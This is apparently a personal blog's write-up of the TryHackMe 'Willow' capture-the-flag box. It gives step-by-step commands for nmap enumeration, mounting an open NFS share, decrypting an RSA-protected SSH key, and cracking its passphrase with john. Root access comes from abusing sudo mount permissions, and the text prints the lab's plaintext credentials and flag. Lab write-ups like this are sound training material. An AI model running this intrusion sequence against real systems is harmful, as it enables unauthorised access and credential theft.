---
title: TryHackMe - Willow Writeup
description: My writeup on willow box.
categories:
 - tryhackme
tags: tryhackme, nfs, hex, mount, rsa, john
---

Interesting box.

You can find the machine there > [Willow](https://tryhackme.com/room/willow){:target="_blank"}

As always let's start with a nmap scan.

```
$ ip=10.10.238.86
$ nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 11:59 EEST
Nmap scan report for 10.10.238.86 (10.10.238.86)
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's start with http, when we visit the webpage we can see some hex data, let's decode them.

```
$ touch hex.txt
$ nano hex.txt 
$ cat hex.txt | xxd -r -p
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029.. +data
```

Interesting, let's check NFS now.

`NFS (Network File System)` -> Allows you to share directories over a network.

Let's identify the shared directory first :

```
$ showmount -e $ip
Export list for 10.10.238.86:
/var/failsafe *
```

Let's mount there now.

```
$ mkdir nfsexploit
$ mount -t nfs $ip:/var/failsafe nfsexploit 
$ cd nfsexploit/
$ ls -la
total 12
drwxr--r-- 2 nobody nogroup 4096 Jan 30 18:31 .
drwxr-xr-x 4 root   root    4096 Jun 14 12:13 ..
-rw-r--r-- 1 root   root      62 Jan 30 18:31 rsa_keys
$ cat rsa_keys 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

I'm not crypto master, but i know some stuff about RSA.

RSA is an asymmetric encryption system, that means uses two keys : a public key for encryption and a private key for decryption.

`Private Key Pair: (61527, 37627)`

Private Key is made up of (n, d) -> (61527, 37627)

I found an awesome RSA decryption site : [site](https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html){:target="_blank"}

![](https://i.ibb.co/RCV5hfy/Screenshot-1.png)

Key is `Proc-Type: 4,ENCRYPTED` now, let's crack it with john.

```
$ locate ssh2john
/usr/share/john/ssh2john.py
$ /usr/share/john/ssh2john.py key > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Press 'q' or Ctrl-C to abort, almost any other key for status
wildflower       (key)
```

Let's login in now.

```
$ chmod 600 key
$ ssh -i key willow@$ip
Enter passphrase for key 'key': 




	"O take me in your arms, love
	For keen doth the wind blow
	O take me in your arms, love
	For bitter is my deep woe."
		 -The Willow Tree, English Folksong




willow@willow-tree:~$ whoami
willow
```

Let's privesc now, if we run `sudo -l`  we can see this :

```
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

We can run mount command as root.

`mount` -> mounting is to attach an additional filesystem on the currently filesystem.

`mount DEVICE_NAME DIRECTORY`

Let's check `/dev`.

```
willow@willow-tree:~$ ls -la /dev
..data..
brw-rw----   1 root disk    202,   5 Jun 14 09:58 hidden_backup
..data..
```

Let's do it.

```
willow@willow-tree:~$ sudo mount /dev/hidden_backup /mnt
willow@willow-tree:~$ cd /mnt
willow@willow-tree:/mnt$ ls
creds.txt
willow@willow-tree:/mnt$ cat creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:/mnt$ su - root
Password: 
root@willow-tree:~# cat root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!

```

Now let's grab the flags lol.

We can see `user.jpg` under willow's directory :

```-rw-r--r--  1 willow willow 12721 Jan 30 19:33 user.jpg```

Let's download it.

```
$ scp -i key willow@10.10.238.86:/home/willow/user.jpg .
Enter passphrase for key 'key': 
user.jpg                   
````

![](https://i.ibb.co/nMSfsNH/Screenshot-2.png)

& we can take root flag with steghide with root's password.

```
$ steghide extract -sf user.jpg 
Enter passphrase: 
wrote extracted data to "root.txt".
[root@0xatom ~/Documents/tryhackme/willow]# cat root.txt 
THM{find_a_red_rose_on_the_grave}
```

Fun box haha, See you! :)
